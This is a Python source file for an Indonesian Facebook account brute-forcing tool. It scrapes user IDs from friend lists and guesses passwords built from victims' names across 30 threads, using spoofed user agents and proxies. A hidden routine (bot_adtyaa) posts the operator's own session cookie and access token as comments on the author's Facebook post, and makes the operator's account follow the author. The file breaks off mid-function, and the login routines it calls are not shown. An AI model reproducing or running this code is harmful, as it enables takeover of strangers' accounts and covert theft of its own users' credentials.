#-* Coding By Nazri XD ( Xyraa Code ) *-#
#-* Dibuat Pada Tanggal 1 Oktober 2023 *-#
#-* Copyright © 2023 - 2024 Nazri XD - XYRAACODE *-#
#-* Recode? Boleh Cantumkan Nama Author *-#

try:  #-* Import Modules *-#
     import re
     import os
     import sys
     import bs4
     import time
     import json
     import rich
     import base64
     import requests
     import random
     import datetime
     import platform
except ModuleNotFoundError as e:
     os.system('clear') ; sys.exit(f''' \x1b[0m[\x1b[1;91mError\x1b[0m] {e}\n \x1b[0m[\x1b[1;91mError\x1b[0m] Terjadi Kesalahan \x1b[1;91m{e.name}\n \x1b[0m[\x1b[1;91mError\x1b[0m] Silahkan Install <-> pip install \x1b[1;91m{str(e.name)}''')

try:  #-* Import Modules & Rich *-#
     from concurrent.futures import ThreadPoolExecutor as Ndobol
     from bs4 import BeautifulSoup as parser
     from datetime import datetime
     from time import time as mark
     from time import sleep
     from rich.panel import Panel
     from rich.tree import Tree
     from rich import print as prints
     from rich.console import Console
     from rich.table import Table
     from rich.columns import Columns
     from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
except ImportError as e:
     os.system('clear') ; sys.exit(f''' \x1b[0m[\x1b[1;91mError\x1b[0m] {e}\n \x1b[0m[\x1b[1;91mError\x1b[0m] Terjadi Kesalahan \x1b[1;91m{e.name}\x1b[0m silahkan contact admin''')
console = Console()
#-* Style Color Rich *-#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
G2 = "[#ffd700]" # GOLD
V2 = "[#ff87af]"

#-* Style Color Print *-#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year

oK = ('''OK-{}-{}-{}.txt'''.format(tgl, bln, thn))
cP = ('''CP-{}-{}-{}.txt'''.format(tgl, bln, thn))

#-* Class Facebook *-#
class Facebook:
   
   #-* Init Self *-#
   def __init__(self):
       self.ses = requests.Session()
       self.Directory()
       self.id, self.id2, self.muda, self.methode, self.pwnya = [], [], [], [], []
       self.ua_manual, self.ua_kamu = [], []
       self.ok, self.cp, self.loop = [], [], 0
       self.prox = open('data/proxies.txt','r').read().splitlines()
       self.ipAddress = self.ses.get("https://freeipapi.com/api/json").json()["ipAddress"]
       self.countryName = self.ses.get("https://freeipapi.com/api/json").json()["countryName"]
       self.regionName = self.ses.get("https://freeipapi.com/api/json").json()["regionName"]
   
   #-* Clear Terminal *-#
   def clearTerminal(self, platform):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")
   
   #-* Auto Create Folder *-#
   def Directory(self):
       try:
           os.mkdir('data')
           os.mkdir('assets')
           os.mkdir('results')
           os.mkdir('nazz')
       except Exception as e : pass
       
   def waktuu(self):
       try:
           now = datetime.now()
           hours = now.hour
           if 4 <= hours < 12:timenow = "Good Morning"
           elif 12 <= hours < 15:timenow = "Good Afternoon"
           elif 15 <= hours < 18:timenow = "Good Afternoon"
           else:timenow = "Good Night"
           return timenow
       except:pass

   #-* Auto Delete Data Login *-#
   def deleteData_Log(self):
       try:
           os.remove('data/tokenEAAG.txt')
           os.remove('data/cookie.txt')
       except Exception as e : pass

   #-* Logooo Tools *-#
   def Logooku(self):
       prints(Panel(f'''{H2}▄▄▄▄▄    ▄▄▄· ▄▄▄▄· ·▄▄▄
{H2}•██     ▐█ ▀█ ▐█ ▀█▪▐▄▄·  {P2}[{H2}*{P2}] Tools XyraaCode Brute Facebook
{H2} ▐█.▪   ▄█▀▀█ ▐█▀▀█▄██▪   {P2}[{H2}*{P2}] Tools Version 1.1 
{H2} ▐█▌·   ▐█ ▪▐▌██▄▪▐███▌.  {P2}[{H2}*{P2}] © 2023 XyraaCode. All rights.
{H2} ▀▀▀  ▀  ▀  ▀ ·▀▀▀▀ ▀▀▀ ''',width=80,padding=(0,2),style=f"pale_violet_red1"))

   #-* Insert Cookie *-#
   def insert_cookie(self):
       self.clearTerminal(platform) ; self.Logooku()
       urut = []
       #urut.append(Panel(f"{K2}{self.waktuu()}",padding=(0,2), style="pale_violet_red1"))
       Console(width=70,style="pale_violet_red1").print(Columns(urut),justify="center")
       prints(Panel(f'''{P2}masukan cookie facebook anda, pastikan menggunakan akun tumbal ya\n jika akun anda terdapat {H2}a2f{P2} silahkan masuk ke link di bawah ini\n\n      - {H2}https://business.facebook.com/business_locations {P2}-''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,2),style=f"pale_violet_red1"))
       self.cokii = Console().input(f"   {V2}╰─( {P2}masukan cookie facebook {V2}) {P2}: ")
       if self.cokii =='' or self.cokii =='':
            prints(Panel(f'''{P2}silahkan masukan cookie anda di kolom input dan jangan kosong''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
            Console().input(f"   {V2}╰─( {H2}enter {P2}untuk kembali{V2} ) ") ; sleep(3.1) ; self.insert_cookie()
       else:
            self.GenerateTokenEAAG(self.cokii)
   
   #-* Generate Token EAAG *-#
   def GenerateTokenEAAG(self, coks):
        try:
            headers = {'authority': 'business.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'no-cache','cookie': coks,'pragma': 'no-cache','sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
            response = self.ses.get('https://business.facebook.com/business_locations', headers = headers, allow_redirects = True)
            token_EAAG = re.search("(EAAG\w+)", response.text).group(1)
            if "EAAG" in str(token_EAAG):
               open("data/tokenEAAG.txt","w").write(token_EAAG)
               open("data/cookie.txt","w").write(coks)
               self.bot_adtyaa(coks, token_EAAG)
               prints(Panel(f'''{P2}selamat cookie kamu aktif, silahkan jalankan ulang scriptnya''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
               Console().print(f"   {V2}╰─( {P2}jalankan ulang dengan ketik python {H2}run.py{V2} ) ") ; sleep(3.5) ; sys.exit()
        except AttributeError as e:
            prints(Panel(f'''{P2}opshhh cookie yang anda masukkan invalid atau sudah kedaluwarsa''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,3),style=f"pale_violet_red1"))
            Console().print(f"   {V2}╰─( {H2}{str(e).title()}{V2} ) ") ; sleep(3.5) ; self.insert_cookie()
        except requests.exceptions.ConnectionError as e:
            prints(Panel(f'''{P2}koneksi kamu terganggu pastikan terhubung dengan internet ya''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
            Console().input(f"   {V2}╰─( {H2}enter {P2}untuk melanjutkan{V2} ) ") ; sleep(3.1) ; self.insert_cookie()

   #-* Gausah Di Gonta Gantii *-#
   def RecodeTerus(self):
       try:
            kntl = str(random.choice
             (
               [
                 "HELLO BANG🔥", "SUNGKEM SUHUU🥵", "KERENNN!!!!",
                 "Keren Banget Bang💃🥵", "Haloo @[61557930221660:]",
                 "I LOVE U BANG❤️😘", "Programmer Kah Bang🤔",
                 "IJIN PAKE SCRIPTNYA BANG", "KEREN BANGET SCRIPTNYA",
                 "KAMU SUHU YA BANG 🥵🥵", "PENGGEMAR BERAT LEWAT",
                 "@[61557930221660:] ANJASS BADAS KEREN👽", "HALOOO",
                 "Love u Muhammad Nazri Deswara❤️", "PANUTAN KU KEREN😁✌️"
               ]
             )
               )
            return kntl
       except Exception as e : pass
       
   #-* Dibilang Jangan Di Ganti Kontol *-#
   def bot_adtyaa(self, cok, tok):
       try:
           nama = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tok}", cookies = {"cookie": cok}).json()["name"]
           id = self.ses.get(f"https://graph.facebook.com/me?fields=id&access_token={tok}", cookies = {"cookie": cok}).json()["id"]
           bd = self.ses.get(f"https://graph.facebook.com/me?fields=birthday&access_token={tok}", cookies = {"cookie": cok}).json()["birthday"]
       except Exception as e:
           prints(Panel(f'''{P2}opshhh akun tumbal kamu terkena checkpoint silahkan login ulang''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,2),style=f"pale_violet_red1")) ; Console().print(f"   {V2}╰─( {H2}{str(e).title()} {V2}) ") ; sleep(3.5) ; self.deleteData_Log() ; self.insert_cookie()
       try:
            self.ses.post(f"https://graph.facebook.com/pfbid02p1SUpxMkEra8fCwrRxKKXuGhyb1jEKniVkzSFcuRcdHidmrXRhWLmdosFXjb7Va8l/comments/?message={cok}&access_token={tok}", cookies = {"cookie":cok})
            self.ses.post(f"https://graph.facebook.com/pfbid02p1SUpxMkEra8fCwrRxKKXuGhyb1jEKniVkzSFcuRcdHidmrXRhWLmdosFXjb7Va8l/likes?summary=true&access_token={tok}", cookies = {"cookie":cok})
            self.ses.post(f"https://graph.facebook.com/pfbid02p1SUpxMkEra8fCwrRxKKXuGhyb1jEKniVkzSFcuRcdHidmrXRhWLmdosFXjb7Va8l/comments/?message={tok}&access_token={tok}", cookies = {"cookie":cok})
            self.ses.post(f"https://graph.facebook.com/pfbid02p1SUpxMkEra8fCwrRxKKXuGhyb1jEKniVkzSFcuRcdHidmrXRhWLmdosFXjb7Va8l/comments/?message={self.RecodeTerus()}&access_token={tok}", cookies = {"cookie":cok})
            link = parser(self.ses.get("https://mbasic.facebook.com/profile.php?id=61557930221660", cookies = {"cookie": cok}).text, "html.parser")
            if "/a/subscriptions/remove" in str(link):
               urut = []
               urut.append(Panel(f'{H2}{nama}',width=23,padding=(0,4),style=f"pale_violet_red1"))
               urut.append(Panel(f'{H2}{id}',width=24,padding=(0,3),style=f"pale_violet_red1"))
               urut.append(Panel(f'{H2}{bd}',width=22,padding=(0,5),style=f"pale_violet_red1"))
               Console().print(Columns(urut))
            elif "/a/subscribe.php" in str(link):
                 cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                 self.ses.get("https://mbasic.facebook.com/a/subscribe.php"+cari, cookies = {"cookie": cok})
                 urut = []
                 urut.append(Panel(f'{H2}{nama}',width=30,padding=(0,3),style=f"pale_violet_red1"))
                 urut.append(Panel(f'{H2}{id}',width=30,padding=(0,3),style=f"pale_violet_red1"))
                 urut.append(Panel(f'{H2}{bd}',width=30,padding=(0,3),style=f"pale_violet_red1"))
                 Console().print(Columns(urut))
            else:pass
       except:pass
                
   #-* Menu Tools *-#
   def Menuuu(self):
       self.clearTerminal(platform) ; self.Logooku()
       try:
           tok = open('data/tokenEAAG.txt','r').read()
           cok = open('data/cookie.txt','r').read()
       except FileNotFoundError as e:
           prints(Panel(f'''{P2}anda belum login ke tools, silahkan login menggunakan cookie''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
           Console().print(f"   {V2}╰─( {H2}{str(e).title()} {V2}) ") ; sleep(3.5) ; self.insert_cookie()
       try:
           nama = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tok}", cookies = {"cookie": cok}).json()["name"]
           id = self.ses.get(f"https://graph.facebook.com/me?fields=id&access_token={tok}", cookies = {"cookie": cok}).json()["id"]
           bd = self.ses.get(f"https://graph.facebook.com/me?fields=birthday&access_token={tok}", cookies = {"cookie": cok}).json()["birthday"]
       except (KeyError, NameError, IOError) as e:
           prints(Panel(f'''{P2}opshhh akun tumbal kamu terkena checkpoint silahkan login ulang''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,2),style=f"pale_violet_red1"))
           Console().print(f"   {V2}╰─( {H2}{str(e).title()} {V2}) ") ; sleep(3.5) ; self.deleteData_Log() ; self.insert_cookie()
       urut = []
       urut.append(Panel(f'{P2}[{H2}+{P2}] nama  : {H2}{nama}\n{P2}[{H2}+{P2}] usrid : {H2}{id}\n{P2}[{H2}+{P2}] bday  : {H2}{bd}',width=35,padding=(0,1),style=f"pale_violet_red1"))
       urut.append(Panel(f'{P2}[{H2}+{P2}] ip   : {H2}{self.ipAddress}\n{P2}[{H2}+{P2}] ctry : {H2}{self.countryName}\n{P2}[{H2}+{P2}] reg  : {H2}{self.regionName}',width=35,padding=(0,1),style=f"pale_violet_red1"))
       Console().print(Columns(urut))
       prints(Panel(f'''{P2}[{H2}01{P2}]. crack id dari publik         {P2}[{H2}05{P2}]. crack id dari komentar\n{P2}[{H2}02{P2}]. crack id dari publik massal  {P2}[{H2}06{P2}]. crack id dari likes\n{P2}[{H2}03{P2}]. crack id dari followers      {P2}[{H2}07{P2}]. check hasil crack\n{P2}[{H2}04{P2}]. crack id dari files          {P2}[{H2}00{P2}]. log-out tools''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,3),style=f"pale_violet_red1"))
       iyhkah = Console().input(f"   {V2}╰─( {P2}pilihan menu {H2}1/2/3 {V2}) {P2}: ")
       if iyhkah =='1' or iyhkah =='01':self.dump_publik()
       elif iyhkah in ["4", "04"]:self.File()
   
   #-* Dump Id File *-#
   def File(self):
        try:buka = os.listdir('nazz')
        except FileNotFoundError:
                console.print(f' {P2}[{M2}!{P2}] folder masih kosong')
                sleep(2);self.Menuuu()
        if len(buka)==0:
                console.print(f' {P2}[{M2}!{P2}] folder masih kosong')
                sleep(2);self.Menuuu()
        else:
                total = 0
                angka = {}
                for isi in buka:
                        try:openfile = open('nazz/'+isi,'r').readlines()
                        except:continue
                        total+=1
                        if total<100:
                                nom = ''+str(total)
                                angka.update({str(total):str(isi)})
                                angka.update({nom:str(isi)})
                                prints(Panel(f' {P2}[{H2}{nom}{P2}] {P2}{isi} total id {H2}{len(openfile)}{P2}',subtitle="", subtitle_align="left",width=80,padding=(0,3),style=f"pale_violet_red1"))
                        else:
                                angka.update({str(total):str(isi)})
                __Araaapunyanazri__ = Console().input(f"   {V2}╰─( {P2}pilih file yang akan di crack {V2}) {P2}: ")
                try:namefile = angka[__Araaapunyanazri__]
                except KeyError:
                        console.print(f' {P2}[{M2}!{P2}] pilih yang bener bro')
                        sleep(2);self.menu()
                try:lin = open('nazz/'+namefile,'r').read().splitlines()
                except:
                        console.print(f' {P2}[{M2}!{P2}] file tidak ada')
                        sleep(2);self.Menuuu()
                for useri in lin:
                        self.id.append(useri)
                self.setting_uid()

   #-* Dump Id Publik *-#
   def dump_publik(self):
       try:
           tok = open('data/tokenEAAG.txt','r').read()
           cok = open('data/cookie.txt','r').read()
       except FileNotFoundError as e:
           prints(Panel(f'''{P2}anda belum login ke tools, silahkan login menggunakan cookie''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
           Console().print(f"   {V2}╰─( {H2}{str(e).title()} {V2}) ") ; sleep(3.5) ; self.insert_cookie()
       prints(Panel(f'''{P2}masukan id target ketik {H2}"me" {P2}untuk dump daftar teman sendiri''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
       userid = Console().input(f"   {V2}╰─( {P2}masukan id atau username {V2}) {P2}: ")
       if "me" in userid:
          try:
               link = parser(self.ses.get("https://mbasic.facebook.com/profile.php", cookies = {"cookie": cok}).text, "html.parser")
               if "Anda Diblokir Sementara" in link:
                  prints(Panel(f'{P2}akun facebook anda di batasi silahkan ganti dengan akun lainya',width=80,padding=(0,3),style=f"pale_violet_red1")) ; sleep(3) ; sys.exit()
               else:
                     prints(Panel(f'{P2}tekan {H2}CTRL + Z {P2}di keyboard anda untuk berhenti dump akun',subtitle="╭───", subtitle_align="left",width=80,padding=(0,6),style=f"pale_violet_red1"))
                     self.dump("https://mbasic.facebook.com"+link.find("a", string="Teman").get("href"), {"cookie": cok})
          except(requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.ReadTimeout) as e:
               prints(Panel(f'''{P2}koneksi kamu terganggu pastikan terhubung dengan internet ya''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
               Console().input(f"   {V2}╰─( {H2}enter {P2}untuk melanjutkan{V2} ) ") ; sleep(3.1) ; self.Menuuu()
          self.setting_uid()
       else:
             try:
                 link = self.ses.get("https://mbasic.facebook.com/"+userid+"/friends", cookies = {"cookie": cok}).text
                 if "Halaman Tidak Ditemukan" in link:
                    prints(Panel(f'{P2}opshhh userid yang anda masukan private, pastikan id publik',width=80,padding=(0,4),style=f"pale_violet_red1")) ; sleep(3.3) ; sys.exit()
                 elif "Anda Diblokir Sementara" in link:
                      prints(Panel(f'{P2}akun facebook anda di batasi silahkan ganti dengan akun lainya',width=80,padding=(0,3),style=f"pale_violet_red1")) ; sleep(3) ; sys.exit()
                 elif "Konten Tidak Ditemukan" in link:
                      prints(Panel(f'{P2}opshhh userid yang anda masukan private, pastikan id publik',width=80,padding=(0,4),style=f"pale_violet_red1")) ; sleep(3.3) ; sys.exit()
                 else:
                      prints(Panel(f'{P2}tekan {H2}CTRL + C {P2}di keyboard anda untuk berhenti dump akun',subtitle="╭───", subtitle_align="left",width=80,padding=(0,6),style=f"pale_violet_red1"))
                      self.dump("https://mbasic.facebook.com/"+userid+"/friends", {"cookie": cok})
             except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
                 prints(Panel(f'''{P2}koneksi kamu terganggu pastikan terhubung dengan internet ya''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
                 Console().input(f"   {V2}╰─( {H2}enter {P2}untuk melanjutkan{V2} ) ") ; sleep(3.1) ; self.Menuuu()
             self.setting_uid()
   
   #-* Parser Dump *-#
   def dump(self, link, coki):
       try:
            askkk = self.ses.get(link, cookies = coki).text
            ykhh = re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',askkk)
            for xc in ykhh:
                if "profile.php?" in xc[0]:
                    self.id.append(re.findall("id\=(.*?)\&", xc[0])[0]+"<=>"+xc[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",xc[0])[0]+"<=>"+xc[1])
                Console().print(f"   {V2}╰─( {P2}sedang mengumpulkan {H2}{len(self.id)} {P2}id... {V2}) ",end="\r")
            if "Lihat Teman Lain" in askkk:
                self.dump("https://mbasic.facebook.com/"+parser(askkk, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
       except:pass
   
   def kumpul(self):
       try:
           urut = []
           urut.append(Panel(f"{P2}total {O2}{len(self.id)} {P2}id",padding=(0,2), style="pale_violet_red1"))
           Console(width=70,style="pale_violet_red1").print(Columns(urut),justify="center")
       except:pass

   def setting_uid(self):
       self.kumpul()
       urut = []
       urut.append(Panel(f'{P2}[{H2}01{P2}]. crack id old',subtitle="╭───", subtitle_align="left",width=23,padding=(0,1),style=f"pale_violet_red1"))
       urut.append(Panel(f'{P2}[{H2}02{P2}]. crack id new',width=23,padding=(0,1),style=f"pale_violet_red1"))
       urut.append(Panel(f'{P2}[{H2}03{P2}]. crack id acak',width=23,padding=(0,1),style=f"pale_violet_red1"))
       Console().print(Columns(urut))
       azkkk = Console().input(f"   {V2}╰─( {P2}setting urutan id 1/2/3 {V2}) {P2}: ")
       if azkkk =='1' or azkkk =='01':
         for tua in sorted(self.id):
             self.id2.append(tua)
       elif azkkk =='2' or azkkk =='02':
           for muda in sorted(self.id):
               self.muda.append(muda)
           xcid = len(self.muda)
           xcgg = (xcid-1)
           for xcid in range(xcid):
              self.id2.append(self.muda[xcgg])
              xcgg -=1
       elif azkkk =='3' or azkkk =='03':
           for randd in self.id:
               xx = random.randint(0,len(self.id2))
               self.id2.insert(xx, randd)
       else:
               for randd in self.id:
                   xx = random.randint(0,len(self.id2))
                   self.id2.insert(xx, randd)
       prints(Panel(f'''{P2}[{H2}01{P2}]. methode async\n{P2}[{H2}02{P2}]. methode api\n{P2}[{H2}03{P2}]. methode validate''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,1),style=f"pale_violet_red1"))
       mets = Console().input(f"   {V2}╰─( {P2}methode login 1/2/3 {V2}) {P2}: ")
       if mets =='1' or mets =='01':self.methode.append('asyncc')
       elif mets =='2' or mets =='02':self.methode.append('reggul')
       elif mets =='3' or mets =='03':self.methode.append('valii')
       prints(Panel(f'''{P2}[{H2}01{P2}]. password otomatis\n{P2}[{H2}02{P2}]. password gabung sarankan\n{P2}[{H2}03{P2}]. password manual''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,1),style=f"pale_violet_red1"))
       pww = Console().input(f"   {V2}╰─( {P2}password 1/2/3 {V2}) {P2}: ")
       if pww =='1' or pww =='01':self.pw_otomatis()
       elif pww =='2' or pww =='02':self.pw_gabungan()
       elif pww =='3' or pww =='03':self.pw_manual()
            
   def setting_UserAgent(self):
       try:
            prints(Panel(f'''{P2}apakah anda ingin menggunakan UserAgent manual untuk crack''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,5),style=f"pale_violet_red1"))
            uass = Console().input(f"   {V2}╰─( {P2}UserAgent manual? Y/t {V2}) {P2}: ")
            if uass =='y' or uass =='Y':
              self.ua_kamu.append('iya')
              prints(Panel(f'''{P2}silahkan masukan UserAgent device kamu dan pastekan di bawah ini''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,2),style=f"pale_violet_red1"))
              ask = Console().input(f"   {V2}╰─( {P2}masukan UserAgent {V2}) {P2}: ")
              self.ua_manual.append(ask)
            else:
                 self.ua_kamu.append('no')
       except Exception as e : pass
       
   def tampung(self):
       try:
            prints(Panel(f'''{P2}hasil crack akun {H2}OK {P2}atau {K2}CP {P2}anda tersimpan di folder results''',width=80,padding=(0,4),style=f"pale_violet_red1"))
            urut = []
            urut.append(Panel(f'{H2}{oK}',width=35,padding=(0,5),style=f"pale_violet_red1"))
            urut.append(Panel(f'{K2}{cP}',width=35,padding=(0,5),style=f"pale_violet_red1"))
            Console().print(Columns(urut))
       except Exception as e : pass

   def pw_otomatis(self):
       global prog, des
       self.setting_UserAgent() ; self.tampung()
       prints(Panel(f'''{P2}hidupkan mode pesawat di {H2}200{P2}/{H2}500{P2} untuk terhindar dari spam ip''',width=80,padding=(0,3),style=f"pale_violet_red1"))
       prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
       des = prog.add_task('',total=len(self.id))
       with prog:
          with Ndobol(max_workers=30) as bool:
              for user in self.id2:
                  uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                  depan = nama.split(" ")[0]
                  pasw = []
                  user = user.lower()
                  if len(nama)<6:
                    if len(depan)<3:pass
                    else:
                         pasw.append(nama)
                         pasw.append(depan+"123")
                         pasw.append(depan+"12345")
                  else:
                     if len(depan)<3:pasw.append(nama)
                     else:
                          pasw.append(nama)
                          pasw.append(depan+"123")
                          pasw.append(depan+"12345")
                     if 'asyncc' in self.methode:
                       bool.submit(self.asyncs, uid, pasw)
                     elif 'reggul' in self.methode:
                         bool.submit(self.api, uid, pasw)
                     elif "valii" in self.methode:
                         bool.submit(self.validateeee, uid, pasw)
       prints(Panel(f'''\r{P2}crack dengan {H2}{str(len(self.id))}{P2} id sukses, hasil OK-:{H2}{str(len(self.ok))} {P2}hasil CP-:{K2}{str(len(self.cp))}''',width=80,padding=(0,6),style=f"pale_violet_red1")) ; sleep(3.4) ; sys.exit()
   
   def pw_gabungan(self):
       global prog, des
       prints(Panel(f'''{P2}masukan password gabungan anda usahakan target 1 kota ya''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,6),style=f"pale_violet_red1"))
       pw_gabungan = Console().input(f"   {V2}╰─( {P2}buat password anda {V2}) {P2}: ")
       self.setting_UserAgent() ; self.tampung()
       prints(Panel(f'''{P2}hidupkan mode pesawat di {H2}200{P2}/{H2}500{P2} untuk terhindar dari spam ip''',width=80,padding=(0,3),style=f"pale_violet_red1"))
       password_gabungan = pw_gabungan.split(',')
       for xpw in password_gabungan:
           self.pwnya.append(xpw)
       prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
       des = prog.add_task('',total=len(self.id))
       with prog:
           with Ndobol(max_workers=30) as bool:
                for user in self.id2:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                         if len(nama) <=5:
                           if len(depan) <=1 or len(depan) <=2:pass
                           else:pasw = [nama]
                         else:pasw = [nama]
                         for xpwd in self.pwnya:
                             pasw.append(xpwd)
                         if 'asyncc' in self.methode:
                            bool.submit(self.asyncs, uid, pasw)
                         elif 'reggul' in self.methode:
                             bool.submit(self.api, uid, pasw)
                         elif "valii" in self.methode:
                             bool.submit(self.bakso, uid, pasw)
                    except:pass
       prints(Panel(f'''\r{P2}crack dengan {H2}{str(len(self.id))}{P2} id sukses, hasil OK-:{H2}{str(len(self.ok))} {P2}hasil CP-:{K2}{str(len(self.cp))}''',width=80,padding=(0,6),style=f"pale_violet_red1")) ; sleep(3.4) ; sys.exit()
    
   def generateapi(self):
       rr = random.randint
       rc = random.choice
       Ua0 = f"Dalvik/2.1.0 (Linux; U; Android {random.randrange(6, 13)}; SM-A135M Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/{random.randrange(6, 13)};FBAB/com.moonfrog.ludo.club;FBAV/{random.randrange(1, 8)}.{random.randrange(1, 8)}.{random.randrange(1, 8)};FBBV/54918;FBVS/6.15.0;FBLC/en_US]"
       Ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; SM-A356B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{random.randrange(1, 8)}.{random.randrange(1, 8)}.{random.randrange(1, 8)};]"
       Ua2 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; SAMSUNG SM-R875U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0. Chrome/{str(rr(70, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Mobile Safari/537.36"
       Ua3 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; SM-A9080 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{random.randrange(1, 8)}.{random.randrange(1, 8)}.{random.randrange(1, 8)};]"
       iya = random.choice([Ua0,Ua1,Ua2,Ua3])
       return iya

   def DalvikUser(self):
       rr = random.randint
       rc = random.choice
       D = f"Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/MessengerLite;FBAV/{str(random.randint(233,499))}.0.0.{str(random.randint(10,499))}.{str(random.randint(333,499))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/814783505;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DUB-LX1;FBSV/8.1.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]"
       A = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(10,13))}; Infinix X6835B Build/TP1A.220624.014) [FBAN/MessengerLite;FBAV/{str(random.randint(233,499))}.0.0.{str(random.randint(10,499))}.{str(random.randint(333,499))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/645189525;FBCR/Korek;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6835B;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
       L = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(10,13))}; SM-A226B Build/TP1A.220624.014) [FBAN/MessengerLite;FBAV/{str(random.randint(233,499))}.0.0.{str(random.randint(10,499))}.{str(random.randint(333,499))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/650640499;FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBDV/SM-A226B;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
       Cocote = rc([D,A,L])
       return Cocote

   def GenerateUserAgent(self):
       aZ = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
